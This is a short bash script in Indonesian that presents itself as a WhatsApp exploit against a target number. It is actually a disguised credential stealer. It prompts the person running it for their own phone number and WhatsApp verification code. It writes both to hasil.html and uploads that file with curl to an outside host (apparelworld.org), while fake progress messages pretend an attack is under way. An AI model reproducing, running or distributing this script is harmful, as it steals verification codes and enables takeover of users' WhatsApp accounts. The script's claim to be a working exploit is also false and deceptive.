#!/bin/bash
clear
echo "
wa gw "083125187277"
############################################
# Whatsapp Exploit # By Fiqi G4nZ          #
# Log Listener     # akukalian11@gmail.com #
############################################

Author = Fiqi Putra Ardiansyah ";
echo "";
read -p "Masukan Nomer Anda => " nomer;
read -p "Masukan Nomer Target => " target;
sleep 2
echo "[+] Sedang Mendapatkan Data...";
sleep 3.0
echo "Login  => $nomer";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "[+] Memulai Exploit...";
echo "Nomer => $nomer" >> hasil.html;
curl -T hasil.html http://apparelworld.org/
sleep 5;
echo "[+] Selesai.";
echo "Sedang Mendapatkan Kode Verifikasi Mohon Tunggu Sebentar.";
read -p "Verify Code => " code;
sleep 2
echo "[+] Menghubungkan Ke Whatsapp.com...";
echo "Login => $nomer";
sleep 1.5
echo "Code => $code";
sleep 1.5
echo "Target => $target";
sleep 1.5
echo "[+] Mengirim Exploit...";
echo "Code => $code" >> hasil.html;
curl -T hasil.html http://apparelworld.org/
sleep 5
echo "[+] Sukses Exploit Follow Instagram @hyputganz_";
exit;
